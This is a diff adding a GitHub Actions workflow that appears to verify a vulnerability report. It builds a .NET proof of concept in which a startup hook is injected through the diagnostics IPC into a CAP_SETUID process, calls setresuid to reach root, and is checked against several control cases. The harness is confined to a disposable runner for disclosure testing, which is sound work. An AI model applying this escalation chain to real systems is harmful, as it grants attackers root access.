@@ -1,0 +1,510 @@
+name: R16 .NET Diagnostics File-Capability Gate
+
+on:
+  push:
+    branches:
+      - msrc-r16-diag-filecap-20261014
+
+permissions:
+  contents: read
+
+jobs:
+  filecap-gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 35
+    env:
+      SDK_URL: https://builds.dotnet.microsoft.com/dotnet/Sdk/10.0.402/dotnet-sdk-10.0.402-linux-x64.tar.gz
+      SDK_SHA512: 1904a98dda2db34ba78ba3c4fb1b224455329af91c341d83547843c1839e112b04ae699ee92fa2449a8f62249196a938723078c0c60b9f65c88539d5687729c2
+      DIAG_CLIENT_VERSION: 0.2.745401
+    steps:
+      - name: Run isolated runtime matrix
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          umask 022
+          LAB="$RUNNER_TEMP/r16-diag-filecap"
+          OUT="$GITHUB_WORKSPACE/r16-output"
+          SDK="$LAB/dotnet"
+          SRC="$LAB/src"
+          BUILD="$LAB/build"
+          rm -rf "$LAB" "$OUT"
+          mkdir -p "$SDK" "$SRC/Victim" "$SRC/Hook" "$SRC/Client" "$BUILD" "$OUT/cases"
+
+          exec > >(tee "$OUT/workflow.stdout.txt") 2> >(tee "$OUT/workflow.stderr.txt" >&2)
+
+          cat > "$OUT/environment.txt" <<EOF
+          utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+          runner_os=$RUNNER_OS
+          runner_arch=$RUNNER_ARCH
+          kernel=$(uname -a)
+          user=$(id)
+          sdk_url=$SDK_URL
+          sdk_sha512=$SDK_SHA512
+          diagnostics_client_version=$DIAG_CLIENT_VERSION
+          EOF
+
+          echo '[1/8] Acquire and verify official SDK 10.0.402'
+          curl --fail --location --retry 5 --retry-all-errors --connect-timeout 20 \
+            --output "$LAB/dotnet-sdk.tar.gz" "$SDK_URL"
+          printf '%s  %s\n' "$SDK_SHA512" "$LAB/dotnet-sdk.tar.gz" | sha512sum -c - | tee "$OUT/sdk-sha512-check.txt"
+          tar -xzf "$LAB/dotnet-sdk.tar.gz" -C "$SDK"
+          export DOTNET_ROOT="$SDK"
+          export PATH="$SDK:$PATH"
+          export DOTNET_CLI_TELEMETRY_OPTOUT=1
+          export DOTNET_NOLOGO=1
+          export NUGET_PACKAGES="$LAB/nuget"
+          dotnet --info | tee "$OUT/dotnet-info.txt"
+          sha256sum "$SDK/dotnet" "$SDK/shared/Microsoft.NETCore.App/10.0.13/libcoreclr.so" \
+            "$SDK/shared/Microsoft.NETCore.App/10.0.13/System.Private.CoreLib.dll" \
+            | tee "$OUT/runtime-sha256.txt"
+
+          echo '[2/8] Write minimal owned fixture'
+          cat > "$SRC/Victim/Victim.csproj" <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <OutputType>Exe</OutputType>
+              <TargetFramework>net10.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+              <UseAppHost>true</UseAppHost>
+            </PropertyGroup>
+          </Project>
+          EOF
+
+          cat > "$SRC/Victim/Program.cs" <<'EOF'
+          using System.Diagnostics;
+          using System.Runtime.InteropServices;
+          using System.Text.Json;
+
+          internal static class Native
+          {
+              [DllImport("libc", SetLastError = true)] internal static extern uint getuid();
+              [DllImport("libc", SetLastError = true)] internal static extern uint geteuid();
+              [DllImport("libc", SetLastError = true)] internal static extern uint getgid();
+              [DllImport("libc", SetLastError = true)] internal static extern uint getegid();
+              [DllImport("libc", SetLastError = true)] internal static extern int prctl(int option, ulong arg2, ulong arg3, ulong arg4, ulong arg5);
+          }
+
+          if (args.Length != 2)
+          {
+              Console.Error.WriteLine("Victim <ready.json> <stop-file>");
+              return 64;
+          }
+
+          var ready = Path.GetFullPath(args[0]);
+          var stop = Path.GetFullPath(args[1]);
+          Directory.CreateDirectory(Path.GetDirectoryName(ready)!);
+          var status = File.ReadAllText("/proc/self/status");
+          var payload = new
+          {
+              pid = Environment.ProcessId,
+              uid = Native.getuid(),
+              euid = Native.geteuid(),
+              gid = Native.getgid(),
+              egid = Native.getegid(),
+              dumpable = Native.prctl(3, 0, 0, 0, 0), // PR_GET_DUMPABLE
+              executable = Environment.ProcessPath,
+              baseDirectory = AppContext.BaseDirectory,
+              runtime = RuntimeInformation.FrameworkDescription,
+              status
+          };
+          File.WriteAllText(ready, JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = true }));
+          Console.WriteLine(JsonSerializer.Serialize(payload));
+          Console.Out.Flush();
+
+          var sw = Stopwatch.StartNew();
+          while (!File.Exists(stop) && sw.Elapsed < TimeSpan.FromSeconds(120))
+          {
+              Thread.Sleep(100);
+          }
+          return 0;
+          EOF
+
+          cat > "$SRC/Hook/Hook.csproj" <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+              <AssemblyName>R16Hook</AssemblyName>
+            </PropertyGroup>
+          </Project>
+          EOF
+
+          cat > "$SRC/Hook/StartupHook.cs" <<'EOF'
+          using System.Runtime.InteropServices;
+          using System.Text.Json;
+
+          public static class StartupHook
+          {
+              [DllImport("libc", SetLastError = true)] private static extern uint getuid();
+              [DllImport("libc", SetLastError = true)] private static extern uint geteuid();
+              [DllImport("libc", SetLastError = true)] private static extern uint getgid();
+              [DllImport("libc", SetLastError = true)] private static extern uint getegid();
+              [DllImport("libc", SetLastError = true)] private static extern int setresuid(uint ruid, uint euid, uint suid);
+              [DllImport("libc", SetLastError = true)] private static extern int chmod(string path, uint mode);
+              [DllImport("libc", SetLastError = true)] private static extern int prctl(int option, ulong arg2, ulong arg3, ulong arg4, ulong arg5);
+
+              public static void Initialize()
+              {
+                  var marker = Environment.GetEnvironmentVariable("R16_PROTECTED_MARKER") ?? "/var/lib/r16/missing/marker.json";
+                  var evidence = Environment.GetEnvironmentVariable("R16_HOOK_EVIDENCE") ?? "/tmp/r16-hook-evidence.json";
+                  var nonce = Environment.GetEnvironmentVariable("R16_NONCE") ?? "missing";
+                  var beforeUid = getuid();
+                  var beforeEuid = geteuid();
+                  var beforeGid = getgid();
+                  var beforeEgid = getegid();
+                  var beforeDumpable = prctl(3, 0, 0, 0, 0);
+                  var beforeStatus = File.ReadAllText("/proc/self/status");
+                  Marshal.SetLastPInvokeError(0);
+                  var rc = setresuid(0, 0, 0);
+                  var errno = Marshal.GetLastPInvokeError();
+                  var afterUid = getuid();
+                  var afterEuid = geteuid();
+                  var afterStatus = File.ReadAllText("/proc/self/status");
+                  var payload = new
+                  {
+                      nonce,
+                      pid = Environment.ProcessId,
+                      marker,
+                      hookAssembly = typeof(StartupHook).Assembly.Location,
+                      beforeUid,
+                      beforeEuid,
+                      beforeGid,
+                      beforeEgid,
+                      beforeDumpable,
+                      setresuidRc = rc,
+                      setresuidErrno = errno,
+                      afterUid,
+                      afterEuid,
+                      beforeStatus,
+                      afterStatus,
+                      utc = DateTimeOffset.UtcNow
+                  };
+                  var json = JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = true });
+                  try
+                  {
+                      Directory.CreateDirectory(Path.GetDirectoryName(evidence)!);
+                      File.WriteAllText(evidence, json);
+                  }
+                  catch { }
+
+                  if (rc == 0 && afterEuid == 0)
+                  {
+                      Directory.CreateDirectory(Path.GetDirectoryName(marker)!);
+                      using (var fs = new FileStream(marker, FileMode.CreateNew, FileAccess.Write, FileShare.None))
+                      using (var sw = new StreamWriter(fs))
+                      {
+                          sw.Write(json);
+                      }
+                      chmod(marker, 0x180); // 0600
+                  }
+              }
+          }
+          EOF
+
+          cat > "$SRC/Client/Client.csproj" <<EOF
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <OutputType>Exe</OutputType>
+              <TargetFramework>net10.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+            </PropertyGroup>
+            <ItemGroup>
+              <PackageReference Include="Microsoft.Diagnostics.NETCore.Client" Version="$DIAG_CLIENT_VERSION" />
+            </ItemGroup>
+          </Project>
+          EOF
+
+          cat > "$SRC/Client/Program.cs" <<'EOF'
+          using Microsoft.Diagnostics.NETCore.Client;
+          using System.Text.Json;
+
+          if (args.Length != 2 || !int.TryParse(args[0], out var pid))
+          {
+              Console.Error.WriteLine("Client <pid> <absolute-hook-path>");
+              return 64;
+          }
+          var hook = Path.GetFullPath(args[1]);
+          var started = DateTimeOffset.UtcNow;
+          try
+          {
+              var client = new DiagnosticsClient(pid);
+              client.ApplyStartupHook(hook);
+              Console.WriteLine(JsonSerializer.Serialize(new { status = "REQUEST_ACCEPTED", pid, hook, started, completed = DateTimeOffset.UtcNow }));
+              return 0;
+          }
+          catch (Exception ex)
+          {
+              Console.WriteLine(JsonSerializer.Serialize(new { status = "REQUEST_REJECTED", pid, hook, started, completed = DateTimeOffset.UtcNow, type = ex.GetType().FullName, ex.Message, ex.HResult }));
+              return 1;
+          }
+          EOF
+
+          cp -a "$SRC" "$OUT/source"
+
+          echo '[3/8] Build shipping-runtime fixture and pinned diagnostics client'
+          dotnet publish "$SRC/Victim/Victim.csproj" -c Release -r linux-x64 --self-contained true \
+            -p:PublishSingleFile=false -p:DebugType=None -o "$BUILD/victim" | tee "$OUT/build-victim.txt"
+          dotnet build "$SRC/Hook/Hook.csproj" -c Release -p:DebugType=None -o "$BUILD/hook" | tee "$OUT/build-hook.txt"
+          dotnet publish "$SRC/Client/Client.csproj" -c Release -r linux-x64 --self-contained true \
+            -p:PublishSingleFile=false -p:DebugType=None -o "$BUILD/client" | tee "$OUT/build-client.txt"
+          dotnet list "$SRC/Client/Client.csproj" package --include-transitive | tee "$OUT/client-packages.txt"
+          sha256sum "$BUILD/victim/Victim" "$BUILD/victim/Victim.dll" "$BUILD/hook/R16Hook.dll" "$BUILD/client/Client" \
+            | tee "$OUT/fixture-sha256.txt"
+
+          echo '[4/8] Install root-owned immutable apphosts and apply only CAP_SETUID to one copy'
+          sudo rm -rf /opt/r16 /var/lib/r16
+          sudo mkdir -p /opt/r16/filecap /opt/r16/ordinary
+          sudo cp -a "$BUILD/victim/." /opt/r16/filecap/
+          sudo cp -a "$BUILD/victim/." /opt/r16/ordinary/
+          sudo chown -R root:root /opt/r16
+          sudo chmod -R a-w /opt/r16
+          sudo chmod 0755 /opt/r16/filecap/Victim /opt/r16/ordinary/Victim
+          sudo setcap cap_setuid+ep /opt/r16/filecap/Victim
+          getcap -n /opt/r16/filecap/Victim /opt/r16/ordinary/Victim | tee "$OUT/apphost-capabilities.txt"
+          stat -c '%n mode=%a uid=%u gid=%g size=%s' /opt/r16/filecap/Victim /opt/r16/ordinary/Victim \
+            | tee "$OUT/apphost-stat.txt"
+
+          RUNNER_NAME="$(id -un)"
+          HOME_DIR="$HOME"
+          HOOK_DLL="$(readlink -f "$BUILD/hook/R16Hook.dll")"
+          CLIENT="$(readlink -f "$BUILD/client/Client")"
+          printf 'not a managed assembly\n' > "$BUILD/invalid-hook.bin"
+          chmod 0644 "$BUILD/invalid-hook.bin"
+
+          wait_for_file() {
+            local file="$1" limit="${2:-100}"
+            for _ in $(seq 1 "$limit"); do
+              [[ -e "$file" ]] && return 0
+              sleep 0.1
+            done
+            return 1
+          }
+
+          start_case() {
+            local name="$1" binary="$2" extra_name="${3:-}" extra_value="${4:-}"
+            local c="$OUT/cases/$name"
+            mkdir -p "$c"
+            rm -f "$c/ready.json" "$c/stop" "$c/hook-evidence.json"
+            local protected="/var/lib/r16/$name"
+            sudo mkdir -p "$protected"
+            sudo chown root:root "$protected"
+            sudo chmod 0700 "$protected"
+            local nonce
+            nonce="$(python3 - <<'PY'
+          import secrets
+          print(secrets.token_hex(16))
+          PY
+          )"
+            printf '%s\n' "$nonce" > "$c/nonce.txt"
+            local env_args=(
+              "HOME=$HOME_DIR"
+              "PATH=/usr/bin:/bin"
+              "TMPDIR=/tmp"
+              "R16_PROTECTED_MARKER=$protected/marker.json"
+              "R16_HOOK_EVIDENCE=$c/hook-evidence.json"
+              "R16_NONCE=$nonce"
+            )
+            if [[ -n "$extra_name" ]]; then env_args+=("$extra_name=$extra_value"); fi
+            env -i "${env_args[@]}" "$binary" "$c/ready.json" "$c/stop" > "$c/victim.stdout.txt" 2> "$c/victim.stderr.txt" &
+            CASE_PID=$!
+            printf '%s\n' "$CASE_PID" > "$c/pid.txt"
+            if ! wait_for_file "$c/ready.json" 150; then
+              echo "ready timeout for $name" > "$c/ready-timeout.txt"
+              return 1
+            fi
+            cp "/proc/$CASE_PID/status" "$c/proc-status.txt" || true
+            find /tmp -maxdepth 1 -type s -name "dotnet-diagnostic-$CASE_PID-*-socket" -printf '%p\n' \
+              | tee "$c/socket-paths.txt" || true
+            while IFS= read -r sock; do
+              [[ -n "$sock" ]] && stat -c '%n mode=%a uid=%u gid=%g' "$sock"
+            done < "$c/socket-paths.txt" > "$c/socket-stat.txt" || true
+          }
+
+          stop_case() {
+            local name="$1" pid="$2" c="$OUT/cases/$name"
+            touch "$c/stop"
+            for _ in $(seq 1 100); do
+              ! kill -0 "$pid" 2>/dev/null && break
+              sleep 0.1
+            done
+            if kill -0 "$pid" 2>/dev/null; then sudo kill "$pid" || true; fi
+            set +e
+            wait "$pid"
+            local rc=$?
+            set -e
+            printf '%s\n' "$rc" > "$c/victim-exit.txt"
+            sudo find "/var/lib/r16/$name" -maxdepth 1 -type f -printf '%p mode=%m uid=%U gid=%G size=%s\n' \
+              > "$c/protected-files.txt" 2>/dev/null || true
+            if sudo test -f "/var/lib/r16/$name/marker.json"; then
+              sudo cat "/var/lib/r16/$name/marker.json" > "$c/protected-marker.json"
+              sudo stat -c '%n mode=%a uid=%u gid=%g size=%s' "/var/lib/r16/$name/marker.json" > "$c/protected-marker-stat.txt"
+            fi
+          }
+
+          echo '[5/8] Positive and causal-control matrix'
+
+          # A: decisive same-UID attach into secure file-capability process.
+          start_case positive /opt/r16/filecap/Victim
+          pid=$CASE_PID
+          set +e
+          "$CLIENT" "$pid" "$HOOK_DLL" > "$OUT/cases/positive/client.json" 2> "$OUT/cases/positive/client.stderr.txt"
+          rc=$?
+          set -e
+          printf '%s\n' "$rc" > "$OUT/cases/positive/client-exit.txt"
+          wait_for_file /var/lib/r16/positive/marker.json 100 || true
+          wait_for_file "$OUT/cases/positive/hook-evidence.json" 100 || true
+          stop_case positive "$pid"
+
+          # B: ordinary no-cap process accepts the hook but cannot cross to UID 0.
+          start_case ordinary /opt/r16/ordinary/Victim
+          pid=$CASE_PID
+          set +e
+          "$CLIENT" "$pid" "$HOOK_DLL" > "$OUT/cases/ordinary/client.json" 2> "$OUT/cases/ordinary/client.stderr.txt"
+          rc=$?
+          set -e
+          printf '%s\n' "$rc" > "$OUT/cases/ordinary/client-exit.txt"
+          wait_for_file "$OUT/cases/ordinary/hook-evidence.json" 100 || true
+          stop_case ordinary "$pid"
+
+          # C: environment startup hook on the same file-cap binary. Distinct-root gate:
+          # the diagnostic finding is invalid if ordinary startup-hook environment injection already works.
+          start_case envhook /opt/r16/filecap/Victim DOTNET_STARTUP_HOOKS "$HOOK_DLL"
+          pid=$CASE_PID
+          sleep 2
+          stop_case envhook "$pid"
+
+          # D: diagnostics explicitly disabled by trusted launcher.
+          start_case diagdisabled /opt/r16/filecap/Victim DOTNET_EnableDiagnostics 0
+          pid=$CASE_PID
+          set +e
+          "$CLIENT" "$pid" "$HOOK_DLL" > "$OUT/cases/diagdisabled/client.json" 2> "$OUT/cases/diagdisabled/client.stderr.txt"
+          rc=$?
+          set -e
+          printf '%s\n' "$rc" > "$OUT/cases/diagdisabled/client-exit.txt"
+          sleep 1
+          stop_case diagdisabled "$pid"
+
+          # E: wrong hook payload cannot create the protected oracle.
+          start_case invalidhook /opt/r16/filecap/Victim
+          pid=$CASE_PID
+          set +e
+          "$CLIENT" "$pid" "$BUILD/invalid-hook.bin" > "$OUT/cases/invalidhook/client.json" 2> "$OUT/cases/invalidhook/client.stderr.txt"
+          rc=$?
+          set -e
+          printf '%s\n' "$rc" > "$OUT/cases/invalidhook/client-exit.txt"
+          sleep 1
+          stop_case invalidhook "$pid"
+
+          # F: lower UID is stopped by current 0600 IPC endpoint; this is not the public ACL CVE.
+          start_case crossuid /opt/r16/filecap/Victim
+          pid=$CASE_PID
+          set +e
+          sudo -u nobody "$CLIENT" "$pid" "$HOOK_DLL" > "$OUT/cases/crossuid/client.json" 2> "$OUT/cases/crossuid/client.stderr.txt"
+          rc=$?
+          set -e
+          printf '%s\n' "$rc" > "$OUT/cases/crossuid/client-exit.txt"
+          sleep 1
+          stop_case crossuid "$pid"
+
+          echo '[6/8] Read-only post-run verification'
+          sudo getcap -n /opt/r16/filecap/Victim /opt/r16/ordinary/Victim > "$OUT/apphost-capabilities-after.txt"
+          sha256sum /opt/r16/filecap/Victim /opt/r16/ordinary/Victim > "$OUT/apphost-sha256-after.txt"
+          diff -u "$OUT/apphost-capabilities.txt" "$OUT/apphost-capabilities-after.txt" > "$OUT/capability-diff.txt" || true
+
+          python3 - "$OUT" <<'PY'
+          import json, os, pathlib, re, sys
+          out = pathlib.Path(sys.argv[1])
+
+          def read_json(p):
+              try: return json.loads(p.read_text())
+              except Exception: return None
+          def intval(p, default=None):
+              try: return int(p.read_text().strip())
+              except Exception: return default
+          def marker(case): return (out/'cases'/case/'protected-marker.json').exists()
+          def ready(case): return read_json(out/'cases'/case/'ready.json') or {}
+          def evidence(case): return read_json(out/'cases'/case/'hook-evidence.json') or read_json(out/'cases'/case/'protected-marker.json') or {}
+          def capeff(case):
+              text=(out/'cases'/case/'proc-status.txt').read_text(errors='replace') if (out/'cases'/case/'proc-status.txt').exists() else ''
+              m=re.search(r'^CapEff:\s*([0-9a-fA-F]+)', text, re.M)
+              return int(m.group(1),16) if m else 0
+
+          checks = {}
+          pr = ready('positive'); pe = evidence('positive')
+          ore = ready('ordinary'); oe = evidence('ordinary')
+          checks['positive_target_started_nonroot'] = pr.get('euid') not in (None, 0)
+          checks['positive_secure_exec_dumpable'] = pr.get('dumpable') in (0, 2)
+          checks['positive_cap_setuid_effective'] = bool(capeff('positive') & (1 << 7))
+          checks['positive_request_accepted'] = intval(out/'cases/positive/client-exit.txt') == 0
+          checks['positive_hook_loaded_exact_pid'] = pe.get('pid') == pr.get('pid')
+          checks['positive_setresuid_succeeded'] = pe.get('setresuidRc') == 0 and pe.get('afterEuid') == 0
+          checks['positive_protected_marker'] = marker('positive')
+          checks['positive_nonce_bound'] = pe.get('nonce') == (out/'cases/positive/nonce.txt').read_text().strip()
+          checks['ordinary_target_dumpable'] = ore.get('dumpable') == 1
+          checks['ordinary_hook_loaded'] = bool(oe)
+          checks['ordinary_setresuid_denied'] = oe.get('setresuidRc') not in (None, 0) and oe.get('afterEuid') != 0
+          checks['ordinary_no_protected_marker'] = not marker('ordinary')
+          checks['environment_hook_blocked'] = not marker('envhook') and not (out/'cases/envhook/hook-evidence.json').exists()
+          checks['diagnostics_disabled_no_marker'] = not marker('diagdisabled')
+          checks['invalid_hook_no_marker'] = not marker('invalidhook')
+          checks['cross_uid_denied'] = intval(out/'cases/crossuid/client-exit.txt') not in (None, 0) and not marker('crossuid')
+          checks['positive_socket_owner_only'] = 'mode=600' in (out/'cases/positive/socket-stat.txt').read_text(errors='replace')
+          checks['apphost_still_root_owned'] = 'uid=0 gid=0' in (out/'apphost-stat.txt').read_text(errors='replace')
+
+          load_bearing = [
+              'positive_target_started_nonroot','positive_secure_exec_dumpable','positive_cap_setuid_effective',
+              'positive_request_accepted','positive_hook_loaded_exact_pid','positive_setresuid_succeeded',
+              'positive_protected_marker','positive_nonce_bound','ordinary_hook_loaded',
+              'ordinary_setresuid_denied','ordinary_no_protected_marker','environment_hook_blocked',
+              'diagnostics_disabled_no_marker','invalid_hook_no_marker','cross_uid_denied',
+              'positive_socket_owner_only','apphost_still_root_owned'
+          ]
+          verdict = 'TECHNICAL_EOP_POC_POSITIVE' if all(checks.get(x) for x in load_bearing) else 'DISPROVED_OR_GATE_FAILED'
+          result = {
+              'schema':'r16-diag-filecap-result-v1',
+              'verdict':verdict,
+              'checks':checks,
+              'passed':sum(bool(v) for v in checks.values()),
+              'total':len(checks),
+              'loadBearingChecks':load_bearing,
+              'runtime':'10.0.13',
+              'sdk':'10.0.402',
+              'diagnosticsClient':'0.2.745401',
+              'scope':'Disposable GitHub-hosted Ubuntu 24.04 runner; owned fixture only',
+              'notClaims':['No production target','No private duplicate clearance','No submission','No universal file-capability deployment prevalence']
+          }
+          (out/'RESULT.json').write_text(json.dumps(result,indent=2)+'\n')
+          (out/'RESULT.txt').write_text(verdict+'\n'+json.dumps(checks,indent=2)+'\n')
+          print(json.dumps(result,indent=2))
+          PY
+
+          echo '[7/8] Hash and package evidence'
+          sudo chown -R "$(id -u):$(id -g)" "$OUT"
+          find "$OUT" -type f ! -name SHA256SUMS.txt -print0 | sort -z | xargs -0 sha256sum > "$OUT/SHA256SUMS.txt"
+          python3 - "$OUT" <<'PY'
+          import json, pathlib, sys
+          root=pathlib.Path(sys.argv[1])
+          files=[]
+          for p in sorted(root.rglob('*')):
+              if p.is_file(): files.append({'path':p.relative_to(root).as_posix(),'bytes':p.stat().st_size})
+          (root/'MANIFEST.json').write_text(json.dumps({'schema':'r16-manifest-v1','files':files},indent=2)+'\n')
+          PY
+          tar -C "$GITHUB_WORKSPACE" -czf "$GITHUB_WORKSPACE/r16-diag-filecap-evidence.tar.gz" r16-output
+          sha256sum "$GITHUB_WORKSPACE/r16-diag-filecap-evidence.tar.gz" | tee "$OUT/EVIDENCE_ARCHIVE_SHA256.txt"
+
+          echo '[8/8] Final result'
+          cat "$OUT/RESULT.txt"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: r16-diag-filecap-evidence
+          path: |
+            r16-output
+            r16-diag-filecap-evidence.tar.gz
+          if-no-files-found: error
+          retention-days: 7
